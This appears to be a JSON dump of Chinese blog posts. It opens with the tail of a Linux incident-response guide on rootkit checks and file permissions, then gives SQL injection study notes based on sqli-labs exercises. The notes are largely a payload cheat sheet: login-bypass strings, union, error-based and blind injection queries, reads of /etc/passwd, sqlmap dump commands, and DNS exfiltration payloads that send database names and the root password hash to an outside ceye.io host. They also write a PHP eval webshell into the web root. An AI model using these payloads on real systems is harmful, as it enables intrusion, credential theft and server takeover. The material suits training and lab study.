Rootkit</h1><p>Rootkit功能通常有隐藏文件、进程、连接、模块，网络嗅探，后门，日志擦除，键盘记录（SSH密码记录）等。</p>\n<p>检查命令替换，比较直观的方式就是比较命令的大小和mtime了。</p>\n<p>1）比对命令的大小</p>\n<p>2）查看命令的修改时间，按修改时间排序</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls -alt /bin/ | head -n 5</span><br></pre></td></tr></table></figure>\n\n<p>而比较全面的检测方式有：</p>\n<p>3）rpm -aV</p>\n<p>RPM Database 不仅提供了 RPM 包的查询功能，还提供了对已安装的 RPM 包进行验证的功能。默认情况下，RPM Database 存放在 /var/lib/rpm 目录。</p>\n<p>需要注意这条命令局限性就是只能检查通过RPM包安装的所有文件。另外为了防止rpm也被替换，上传一个安全干净稳定版本rpm二进制到服务器上进行检查。</p>\n<p>我们可以对系统中所有 RPM 文件做一个全面检查</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -aV</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">查看bash</span></span><br><span class=\"line\">rpm -Vf /bin/bash</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">S: 表示文件长度发生了变化</span><br><span class=\"line\">M: 表示文件的访问权限或文件类型发生了变化</span><br><span class=\"line\">5: 表示MD5校验和发生了变化。</span><br><span class=\"line\">D: 表示设备节点的属性发生了变化</span><br><span class=\"line\">L: 表示文件的符号链接发生率变化</span><br><span class=\"line\">U: 表示文件/子目录/设备节点的owner发生了变化</span><br><span class=\"line\">G: 表示文件/子目录/设备节点的group发生了变化</span><br><span class=\"line\">T: 表示文件最后一次的修改时间发生了变化</span><br></pre></td></tr></table></figure>\n\n<p>4）使用chkrootkit和rkhunter查看</p>\n<h1 id=\"0x10-病毒检测\"><a href=\"#0x10-病毒检测\" class=\"headerlink\" title=\"0x10 病毒检测\"></a>0x10 病毒检测</h1><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://x.threatbook.cn/</span><br><span class=\"line\">http://www.virscan.org</span><br><span class=\"line\">https://www.virustotal.com/</span><br><span class=\"line\">https://fireeye.ijinshan.com/</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x11-文件权限\"><a href=\"#0x11-文件权限\" class=\"headerlink\" title=\"0x11 文件权限\"></a>0x11 文件权限</h1><p>一般是使用chattr或者setfacl来设置权限。</p>\n<p>chattr可以修改属性能够提高系统的安全性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var目录，常用参数如下：</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">i</span>：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。<span class=\"built_in\">i</span>参数对于文件 系统的安全设置有很大帮助。</span><br><span class=\"line\"></span><br><span class=\"line\">s：保密性地删除文件或目录，即硬盘空间被全部收回。</span><br><span class=\"line\"></span><br><span class=\"line\">u：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。</span><br></pre></td></tr></table></figure>\n\n<p>例子：</p>\n<p>设置/etc/resolv.conf为不可修改</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@vincent tmp]# chattr +i /etc/resolv.conf</span><br><span class=\"line\"></span><br><span class=\"line\">[root@vincent tmp]# lsattr /etc/resolv.conf</span><br><span class=\"line\"></span><br><span class=\"line\">----i--------e- /etc/resolv.conf</span><br><span class=\"line\"></span><br><span class=\"line\">[root@vincent tmp]# echo \"\" &gt; /etc/resolv.conf</span><br><span class=\"line\"></span><br><span class=\"line\">-bash: /etc/resolv.conf: 权限不够</span><br></pre></td></tr></table></figure>\n\n<p>可以使用lsattr查看文件权限</p>\n<p>setfacl其实是设置文件的访问控制列表，传统的 Linux 文件系统的权限控制是通过 user、group、other 与 r(读)、w(写)、x(执行) 的不同组合来实现的，同时存在不灵活的问题， 例如目录 /data 的权限为：drwxr-x—，所有者与所属组均为 root，在不改变所有者的前提下，要求用户 tom 对该目录有完全访问权限 (rwx).考虑以下2种办法 (这里假设 tom 不属于 root group)</p>\n<p>(1) 给 /data 的 other 类别增加 rwx permission，这样由于 tom 会被归为 other 类别，那么他也将拥有 rwx 权限。</p>\n<p>(2) 将 tom 加入到 root group，为 root group 分配 rwx 权限，那么他也将拥有 rwx 权限。</p>\n<p>以上 2 种方法其实都不合适，为了解决这些问题，Linux 开发出了一套新的文件系统权限管理方法，叫文件访问控制列表 (Access Control Lists, ACL)。简单地来说，ACL 就是可以设置特定用户或者用户组对于一个文件的操作权限。文件的所有者以及有CAP_FOWNER（在目前的linux系统上，root用户是唯一有CAP_FOWNER能力的用户）的用户进程可以设置一个文件的acl。ACL 有两种，一种是access ACL，针对文件和目录设置访问控制列表。一种是default ACL，只能针对目录设置。如果目录中的文件没有设置 ACL，它就会使用该目录的默认 ACL.</p>\n<p>getfacl获取文件权限</p>\n<p>setfacl设置Access ACL</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setfacl -m u:root:rwx &#123;file&#125;</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">取消ACL</span></span><br><span class=\"line\">setfacl -b &#123;file&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><p><a href=\"http://vinc.top/2017/09/20/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%A7%BF%E5%8A%BF/\" target=\"_blank\" rel=\"noopener\">http://vinc.top/2017/09/20/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%A7%BF%E5%8A%BF/</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/ZUJ87wWbzccw_zSRADfCVg\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/ZUJ87wWbzccw_zSRADfCVg</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/xodT25Pn3fW1xHrU0IhBDQ\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/xodT25Pn3fW1xHrU0IhBDQ</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/Z0kBcwy379x_J-Xm2Y-Vlg\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/Z0kBcwy379x_J-Xm2Y-Vlg</a></p>\n<p><a href=\"https://www.xsec.io/2018/8/31/emergency-response.html\" target=\"_blank\" rel=\"noopener\">https://www.xsec.io/2018/8/31/emergency-response.html</a></p>\n<p><a href=\"https://www.freebuf.com/articles/network/186071.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/network/186071.html</a></p>\n<p><a href=\"https://github.com/iamckn/backdoors\" target=\"_blank\" rel=\"noopener\">https://github.com/iamckn/backdoors</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/1I0MpWXcyJoe5zGFLnv8gw\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/1I0MpWXcyJoe5zGFLnv8gw</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/-T9wupsSfW1Q73ocPgvMBg\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/-T9wupsSfW1Q73ocPgvMBg</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/s0Rvlzrwx6uW_Po5AcusnQ\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/s0Rvlzrwx6uW_Po5AcusnQ</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/tu3c0l_2Bu4kNGqp3tlxKw\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/tu3c0l_2Bu4kNGqp3tlxKw</a></p>\n"},{"title":"SQL注入漏洞","date":"2018-10-01T12:46:26.000Z","_content":"\n### 1. OSI七层模型\n\n- 物理层 、数据链路层、网络层、传输层、会话层、表示层、应用层\n\n### 2. TCP三次握手\n\n- （1）客户端发送SYN（SEQ=x）报文给服务器端，进入SYN_SEND状态。\n- （2）服务器端收到SYN报文，回应一个SYN （SEQ=y）ACK(ACK=x+1）报文，进入[SYN_RECV](https://baike.baidu.com/item/SYN_RECV)状态。\n- （3）客户端收到服务器端的SYN报文，回应一个ACK(ACK=y+1）报文，进入Established状态。\n\n### 3. TCP四次分手\n\n- （1）某个应用进程首先调用close，称该端执行“主动关闭”（active close）。该端的TCP于是发送一个FIN分节，表示数据发送完毕。\n- (2) 接收到这个FIN的对端执行 “被动关闭”（passive close），这个FIN由TCP确认。\n- (3) 一段时间后，接收到这个文件结束符的应用进程将调用close关闭它的套接字。这导致它的TCP也发送一个FIN。\n- (4) 接收这个最终FIN的原发送端TCP（即执行主动关闭的那一端）确认这个FIN。 \n\n### 4. HTTP状态码\n\n- 2XX  成功\n- 3XX  跳转\n- 4XX  错误\n- 5XX   服务器错误\n\n### 5.  常用端口\n\n- 21   FTP\n- 22  SSH\n- 23  Telent\n- 25   SMTP\n- 53   DNS\n- 80   HTTP\n- 135 \n- 139 \n- 443  HTTPS\n- 445  SMB\n- 1433  SQLSERVER\n- 1521   ORCAL\n- 3306  MYSQL\n- 3389   rdp\n- 4899    远程桌面\n- 5900-59XX   VNC\n- 8080  管理端口\n\n### 6. 数据库基础\n\n#### 主流数据库\n\n- SQL SERVER\n- MYSQL\n- oraccle\n- PostgreSQL\n- 可以使用  Navicat premium  连接数据库\n\n#### 数据库查询版本\n\n- Mssql   select  @@version\n- Mysql    select  vresion（）/select @@version\n- oracle    select banner from ￥version\n- Postgresql  select version（）\n\n#### SQL语法基础\n\n- 库操作\n\n  - 连接数据库   mysql  -u  用户名 -p\n  - 创建数据库：create database  数据库名称、\n  - 删除数据库    drop  database 数据库名称、\n  - 列出数据库  show databases\n  - 使用数据据库  use 数据库名称、\n  - 查看当前数据库   select database（）\n\n- 表操作\n\n  - 新建表create table  表名（键 varchar（10），键int（10））\n  - 列出表  show tables\n  - 删除表  delete  表名\n\n- 数据操作\n\n  - 增加数据insert into  表名（键，键）values（值，值）\n\n  - 删除数据 delete from 表名 where  键=值（删除某一行数据）\n\n  - 修改数据 updata 表名 set 键 = 值 where 键=值\n\n  - 查询数据  select * fom 表名\n\n    存放数据库 information_ schema（存放schemata、  table、columns等等）     \n\n    存放数据库名  schemata\n\n    表  table\n\n    字段  columns\n\n### 7.  注入漏洞\n\n#### 注入概述\n\n- 什么是注入漏洞、\n  - 注入攻击的本质，Web应用程序没有过滤用户输入*，直接把用户输入的恶意数据当做代码执行\n  - 两个条件\n    - 用户能够控制输入\n    - 原本程序要执行的代码，拼接了用户输入的数据\n\n#### 注入类型\n\n- SQL注入：攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗数据库服务器执行恶意的SQL命令命令注入：后端未过滤掉恶意数据，代码当做系统命令执行。\n- 代码注入：一般出现在不安全的使用某些函数\n  - 文件包含\n  - 反序列化漏洞\n- LDAP注入\n  - LDAP（轻量级目录访问协议），用于访问网络中的目录服务，常用在Active Directory，企业管理目录。\n    用户提交的输入不经验证插入LDAP搜索过滤器中，攻击者通过提交专门设计的输入修改过滤器的结构，以检索数据或执行未授权操作\n- XML注入\n  - XXE漏洞：引用外部实体时，通过构造恶意内容，导致读取任意文件、\n    执行系统命令、探测内网端口、攻击内网网站等危害。\n  - XPath注入：与SQL注入类似，XPath解析器本身对URL、表单中提交的代码内容未作严格限制，导致恶意代码可以直接解析执行\n  - XQuery注入\n- JSON注入：轻量级的数据交换格式，主要利用特殊字符注入JSON中，造成解析失败\n- JSONP注入：回调函数未作严格的检测和过滤\n- 判断一个HTTP请求是否存在SQL注入的方式：\n  - 经典：and1=1|and2>1|or1=1 |or1<1\n  - 数据库函数：and sleep（4】=1 I and length（user（）】>3\n  - 特殊符号：单引号（’）双引号（”）\n\n#### 注入点\n\n- GET\n- POST\n- Cookie\n- Host\n- User-Agent\n\n#### 自动化注入工具\n\n- （1）SQL注入工具：\n  - Sqlmap Havij Sqlid\n- （2）ASP，JSP注入工具：\n  - NBSI阿D注入软件明小子注入软件\n- （3）PHP注入工具：\n  - 穿山甲注入软件海阳顶端注入软件\n\n### 8. SQL手工注入步骤\n\n#### 注入点寻找\n\n- 判断请求方式\n\n  - 浏览器F12  点网络\n\n- 单引号闭合’  ‘\n\n- 数字\n\n- 单引号括号闭合（’ ‘）\n\n- 双引号括号闭合（“ ”）\n\n- or 1=1\n\n- or 1=2\n\n- and 1=1\n\n- and 1=2\n\n- #### 数字型注入\n\n  - 加单引号  错误出异常\n  - and 1=1   正常\n  - and   1=2  异常\n\n- #### 字符型注入\n\n  - 加单引号  错误出异常\n  - and '1' = '1  正常\n  - and '1' = '2  异常\n\n#### 判断字段长度\n\n- order  by  数字   可以判断字段的个数\n- 也可以用猜字段  union  select 1，2，3\n\n#### 判断字段回显位置\n\n在链接后面添加语句`【 union select 1,2,3,4,5,6,7,8,9,10,11#】`进行联合查询（联合查询时记得把前面的查询为空）来暴露可查询的字段号。 \n\n#### 判断数据库注入\n\n利用内置函数暴数据库信息 \nversion()版本；database()数据库；user()用户； \n不用猜解可用字段暴数据库信息(有些网站不适用): \nand 1=2 union all select version() \nand 1=2 union all select database() \nand 1=2 union all select user() \n操作系统信息：and 1=2 union all select @@global.version_compile_os from mysql.user \n数据库权限： \nand ord(mid(user(),1,1))=114 返回正常说明为root \n\n#### 查找数据库名\n\n- GET：IP/Less-1/?id=100' union select 1,(select database()),3--+\n\n- POST：union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+\n\n- 查看数据库长度length（） and length(database())>10--+\n\n- 查看数据库名字mid（）或者left    \n\n  - mid (string，start，length）返回指定的字符串从指定位置开始（可以用来猜数据库名 ） and mid(database(),1,1)>'a'\n\n  - left (string,lenth)  返回最左边指定的字符数\n\n    and left(database(),1)>'a'  (猜名字)\n\n- 将查到的库名放到同一个字符串\n\n  - select GROUP_CONCAT(schema_name) from information_schema.schemata\n\n- 查到数单个据库名发送到ceye\n\n  - union select 1,(select load_file(concat('\\\\\\\\',substr((select schema_name from information_schema.schemata  limit 1),1,41),'.mysql.ip.port.38ljf2.ceye.io\\\\abc')))--+\n\n#### 查找数据表\n\n- union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security') ,3 \n\n- 将单个表名发送到ceye\n\n  uname=1') union select 3,(select load_file(concat('\\\\\\\\',substr((select table_name from information_schema.tables where table_schema ='security'  limit 1),1,41),'.mysql.ip.port.38ljf2.ceye.io\\\\abc')))--+\n\n#### 查找数据表中所有字段（列）\n\n- #### 127.0.0.1/Less-3/?id=100') union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security') --+\n\n- 获取内容\n\n  - union select 1,(select group_concat(username) from security.users limit 0,1),3 \n\n- 查询某一个表的字段名发送到ceye\n\n  - union select 1,(select load_file(concat('\\\\\\\\',substr((select column_name from information_schema.columns where table_name='users' and table_schema='security' limit 1),1,41),'.mysql.ip.port.38ljf2.ceye.io\\\\abc')))--+\n\n#### 猜解账号密码\n\n- outfile文件注入\n\n  - union select 1,'<?php @eval($_POST[360]);?>' into outfile 'C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\Less-8\\\\3.php'--+\n  - into outfile 'C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\Less-13\\\\1.txt'\n\n- 查root密码ceye代码\n\n  127.0.0.1/Less-1/?id=1' union SELECT 1,(LOAD_FILE(CONCAT('\\\\\\\\',mid((SELECT password FROM mysql.user WHERE user='root' LIMIT 1),2,41),'.mysql.ip.port.38ljf2.ceye.io\\\\abc'))),3--+\n\n- bug   \n\n  uname=1') or 1=1 into outfile 'C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\Less-13\\\\1.txt';--+\n\n  这个文件里会有所有的用户名和密码\n\n- 查询数据\n\n  union select 1,(select 1 from (select count(*),concat((select(select(select distinct concat(username,password) from users limit 0,1))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+\n\n#### 绕过登陆验证\n\n- admin' --\n- admin' #\n- admin'/*\n- ' or 1=1--\n- ' or 1=1#\n- ' or 1=1/*\n- ') or '1'='1--\n- ') or ('1'='1--\n\n#### SQL注入常见函数\n\n- group_concat函数   可以把查询的内容组合成一个字符串\n\n- load_file(file name )  读取文件并将文件按字符串返回\n\n- left（string，length）返回最左边指定的字符数：\n  left（database（），1）>'s'  (猜名字)\n\n- length（）判断长度\n  length（database（）>5 \n\n- substr（a，b，c）从字符串a中截取 b到c长度\n\n- ascii（）将某个字符转为ascii值\n\n  ascii（substr（user（），1，1））=101#\n\n- mid（（a，b，c）从字符串a中截取 b到c位置（可以用来猜数据库名 ）\n\n### 9. SQL注入备忘\n\n#### SQL注入常用命令\n\n- 查看当前用户：union select 1,(select user())--+\n\n- 查看数据库版本：union select 1,(select version())--+\n\n- 查看当前数据库名：union select 1,(select database())--+\n\n- 查看操作系统union select 1,(select @@version_compile_os)--+\n\n- 所有用户：\n\n  - union select 1,(select group_concat(user) from mysql.user)--\n\n    +\n\n- 用户hash\n\n  - union select 1,(select group_concat(password) from mysql.user where user='root')\n\n- 查看所有数据库名\n\n  - union select 1,(SELECT group_concat(schema_name) from information_schema.schemata)--+\n\n- 查看某一个库的全部表\n\n  - union select 1,(SELECT group_concat(table_name) from information_schema.tables where table_schema='库名')--+\n  - union select 1,(SELECT group_concat(table_name) from information_schema.table_constraints where table_schema='库名'\n\n- 查看某个表的字段名\n\n  - union select 1,(SELECT group_concat(column_name) from information_schema.columns where table_name='表名')--+\n\n- 查看某个库中某个表的字段名\n\n  - union select 1,(select group_concat(column_name) from information_schema.columns where table_name='表名' and table_schema='库名')--+\n\n- 读文件\n\n  - union select 1,(SELECT load_file('/etc/passwd'))--+\n\n- 写文件\n\n  - union select 1,'<?php @eval($_POST[360]);?>' into outfile 'C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\Less-8\\\\3.php'--+\n\n#### UNION注入\n\n- 猜字段长度\n  - order by 数字     uname=1' order by 2\n- 暴字段位置\n  - union select 1,2      uname=1' union select 1,2\n- 在指定表中查询制指定用户的密码\n  - union SELECT 1,password from 表 where username='用户名'--+\n\n#### 报错注入\n\n- floor   （SELECT user()可修改）\n\n  - OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--+\n\n- ### ExtractValue(有长度限制,最长32位)   （select @@version可修改）\n\n  - and extractvalue(1, concat(0x7e, (select @@version),0x7e))--+\n\n- ### UpdateXml(有长度限制,最长32位)  （SELECT @@version可修改）\n\n  - and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--+\n\n- ### NAME_CONST(适用于低版本，不太好用)\n\n  - and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--+\n\n- ### Error based Double Query Injection\n\n  - or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1--+\n\n- ### exp(5.5.5以上) （select user()可修改）\n\n  - and (select exp(~(select * from(select user())x)))--+\n\n- floor(Mysql):  and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);\n\n- Extractvalue(Mysql):  and (extractvalue(1,concat(0x7e,(select user()),0x7e)));\n\n- Updatexml(Mysql):  and (updatexml(1,concat(0x7e,(select user()),0x7e),1));\n\n- EXP: and exp(~(select * from(select user())a));\n\n- UTL INADDR. get host address(Oracle): and 1=utl inaddrget host address(select bannerO from sys.v_$version where rownum=1))\n\n- multipoint(Mysql)：and multipoint((select * from(select * from(select user())a)b));\n\n- polygon(Mysql)：and polygon((select * from(select * from(select user())a)b));\n\n- multipolygon(Mysql)：and multipolygon((select * from(select * from(select user())a)b));\n\n- linestring(Mysql)：and linestring((select * from(select * from(select user())a)b));\n\n- multilinestring(Mysql)：and multilinestring((select * from(select * from(select user())a)b));\n\n#### bool盲注\n\n- 盲注的时候一定注意，MySQL4之后大小写不敏感，可使用binary()函数使大小写敏感。\n\n- ##### 布尔条件构造\n\n  - ```sql\n    //正常情况\n    'or bool#\n    true'and bool#\n        \n    //不使用空格、注释\n    'or(bool)='1\n    true'and(bool)='1\n        \n    //不使用or、and、注释\n    '^!(bool)='1\n    '=(bool)='\n    '||(bool)='1\n    true'%26%26(bool)='1\n    '=if((bool),1,0)='0\n        \n    //不使用等号、空格、注释\n    'or(bool)<>'0\n    'or((bool)in(1))or'0\n        \n    //其他\n    or (case when (bool) then 1 else 0 end)\n    ```\n\n  - 有时候where字句有括号又猜不到SQL语句的时候，可以有下列类似的fuzz\n\n  - ```sql\n    1' or (bool) or '1'='1\n    1%' and (bool) or 1=1 and '1'='1\n    ```\n\n- ##### 构造逻辑判断\n\n  - 逻辑判断基本就那些函数：\n\n  - ```sql\n    left(user(),1)>'r'  \n    right(user(),1)>'r'  \n    substr(user(),1,1)='r'  \n    mid(user(),1,1)='r' \n        \n    //不使用逗号 \n    user() regexp '^[a-z]'\n    user() like 'root%'\n    POSITION('root' in user())\n    mid(user() from 1 for 1)='r'\n    mid(user() from 1)='r'\n    ```\n\n- ##### 利用order by盲注\n\n  ```sql\n  mysql> select * from admin where username='' or 1 union select 1,2,'5' order by 3;\n  +----+----------+---------------------------\n  | id | username | password                   \n  +----+----------+---------------------------\n  |  1 | 2        | 5                         \n  |  1 | admin    | 51b7a76d51e70b419f60d34 |\n  +----+----------+---------------------------\n  2 rows in set (0.00 sec)\n      \n  mysql> select * from admin where username='' or 1 union select 1,2,'6' order by 3;\n  +-----+--------+---------------------------\n  |id   |username| password                  \n  +----+--------+---------------------------\n  |  1  | admin- |51b7a76d51e70b419f60d3\n  |  1  |    2   | 6                            +------+----------+-------------------------\n  2 rows in set (0.01 sec)\n  ```\n\n#### 延时盲注\n\n- 相对于bool盲注，就是把返回值0和1改为是否执行延时，**能用其他方法就不使用延时**。 \n- 一般格式`if((bool),sleep(3),0)`和`or (case when (bool) then sleep(3) else 0 end)`\n- 两个函数： \n- BENCHMARK(100000,MD5(1)) \n- sleep(5)\n- BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep()\n\n#### Mysql注释符\n\n```sql\n1. -- -\n2. /* .... */\n3. #\n4. `\n5. ;%00 \n```\n\n#### GBK绕过注入\n\n- 在分号前加%df%27\n- 示例：id=1%d%27 union select 1.2--+\n\n10. 自动化注入工具\n\n#### SQL注入工具\n\n- sqlmap使用\n  - 测试注入点  sqlmap  -u  \"URL\"\n  - 爆数据库  sqlmap  -u  \"URL\"  --dbs\n  - 查看当前库  sqlmap  -u  \"URL\"  --current -db\n  - 显示数据表  sqlmap  -u  \"URL\"  -D 数据库 --tables\n  - 显示字段      sqlmap  -u  \"URL\"  -D 数据库 -T 表  --columns\n  - 脱库  sqlmap  -u  \"URL\"  -D 数据库 -T 表  -C \"字段名1\",\"字段名2\"  --dump\n  - 查看帮助   man  sqlmap\n  - 查看注入点   sqlmap -r  1.txt \n  - 爆数据库   sqlmap -r  1.txt  --dbs    （注意在注入点后面加*）\n  - 查看当前库  sqlmap  -r  1.txt  --current -db\n  - 显示数据表   sqlmap   -r  1.txt   -D 数据库 --tables\n  - 显示字段      sqlmap  -r  1.txt  -D 数据库 -T 表  --columns\n  - 查看某字段数据  sqlmap  -r  1.txt  -D 数据库 -T 表  -C  “字段名，字段名”  --dump\n- havij\n- sqlid\n\n#### ASP、JSP注入工具\n\n- NBSI\n- 阿D注入软件\n- 明小子\n\n#### PHP注入工具\n\n- 穿山甲注入软件\n- 海阳顶端注入软件\n\n#### 安全专家用的注入工具\n\n- BSQL Hacker（注入框架）\n- The Mole（可攻击Mysql、SQL server、Postgres和oracle）\n- Pangolin （白帽专用啊哈哈哈哈）\n- sqlamp  （非常强大）\n- Havij （可攻击Mysql、oracle、Postgres、MS Access）\n- safe3 SQL Injector（简单易用）\n- SQL Poizon\n\n### 10. 笔记\n\n- 爆SQL\n  select schema_name from information_schema.schemata\n  猜数据库\n  select schema_name from information_schema.schemata limit 0,1 （limit第几行）\n  test\n- select table_name from information_schema.tables where table_schema='xxxxx'\n  猜某库的数据表\n- select column_name from information_schema.columns where table_name='xxxxx'\n  猜某表的所有列\n- select *** from ***\n- \n- mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位\n  ord 同ASCII\n  substr（user(),2,1）\n  substr（database(),2,1）从databases数据库名的第2位，截取长度为1\n  Order by 对前面的数据进行排序\n  information_schema 系统数据库名\n  tables 表名\n  information_schema.tables 查询这个数据库表\n  table_schema 这个字段\n  select table_name from information_schema.tables where table_schema = \"security\";\n  select 列名称from表名 where列 运算符 值\n  @$sql=\"SELECT username, password FROM users WHERE username='admin'or'1'='1# and\n  password='$passwd' LIMIT 0,1\";\n  数据库运行的SQL语句代码如上:\n  输入“ ‘后，注意 提示语法错误的 注明 ’ ” ）\n  ') or '1'=('1' \n  ) or 1=1 -\n  ') or 1=1 order by 2  查看几列\n- 显示登录信息可以使用联合查询得到数据库名等信息\n  uname=1admin'union select 1,database()-- -&passwd=&submit=Submit\n  联合查询  得到  database(数据库名)\n- 不显示登录信息使用 布尔型盲注\n  uname=admin')and left(database(),1)>'a'#&passwd=1&submit=Submit\n  database(),1表示第一位 >大于a        大于的话就返回true\n  left(database(),1) ='s'    截取数据库名的前1位 \n  left(database(),2) ='se'  截取数据库名的前2位 \n  length(database())=8  查看数据库的长度\n  left(version()1)=5    查看数据库第1位为5\n  通过二分法 查到某位没有>,= a（或者数字）\n  注释掉最后字符 -- - --+ # %23 （每个试）\n- substr(database(),,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换\n  为 ascii 值\n- admin'and If(ascii(substr(database(),2,1))=115,1,sleep(5))#\n  时间注入 正确的话 直接登录，否则延迟5秒，得出 数据库名为 security\n  'and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))-- -\n  猜测第一个数据表的第一位是 e...依次类推，得到 emai\n  limit 0,1 从0的位置开始 第1行 是emai  limit 1,1 从1的位置开始 第1行 是 ？？\n  猜测 users 表的列\n  http://127.0.0.1/sqllib/Less-9/?id=1'and If(ascii(substr((select column_name from information\n  _schema.columns where table_name='users' limit 0,1),1,1))=105,1,sleep(5))--+\n  猜测 username 的值\n  http://127.0.0.1/sqllib/Less-9/?id=1'and If(ascii(substr((select username from users limit 0,1), 1,1))=68,1,sleep(5))-- -\n  猜第2位\n  'and If(ascii(substr((select username from users limit 0,1), 2,1))=117,1,sleep(5))-- -\n  是Dump\n  SELECT CONCAT(id, '，', name) AS con FROM info LIMIT 1\n  concat 某几列\n  limit1    行1\n  以上为  查询第一行的  id 列 和name列，中间用,号隔开\n- 报 错 注 入\n  1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+\n- uname=admin\"and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&passwd=1&sub\n  If(ascii(substr(database(),1,1))>115,0,sleep(5))%23\n- select table_name from information_schema.tables where table_schema='security' limit 0,1\n  table_name   \n  MYSQL 里面所有的表\n  information_schema.tables\n- 系统函数\n  介绍几个常用函数：\n- 1. version()——MySQL 版本\n  2. user()——数据库用户名\n  3. database()——数据库名\n  4. @@datadir——数据库路径\n  5. @@version_compile_os——操作系统版本","source":"_posts/SQL注入漏洞.md","raw":"---\ntitle: SQL注入漏洞\ndate: 2018-10-01 20:46:26\ntags:\ncategories: sql注入\n---\n\n### 1. OSI七层模型\n\n- 物理层 、数据链路层、网络层、传输层、会话层、表示层、应用层\n\n### 2. TCP三次握手\n\n- （1）客户端发送SYN（SEQ=x）报文给服务器端，进入SYN_SEND状态。\n- （2）服务器端收到SYN报文，回应一个SYN （SEQ=y）ACK(ACK=x+1）报文，进入[SYN_RECV](https://baike.baidu.com/item/SYN_RECV)状态。\n- （3）客户端收到服务器端的SYN报文，回应一个ACK(ACK=y+1）报文，进入Established状态。\n\n### 3. TCP四次分手\n\n- 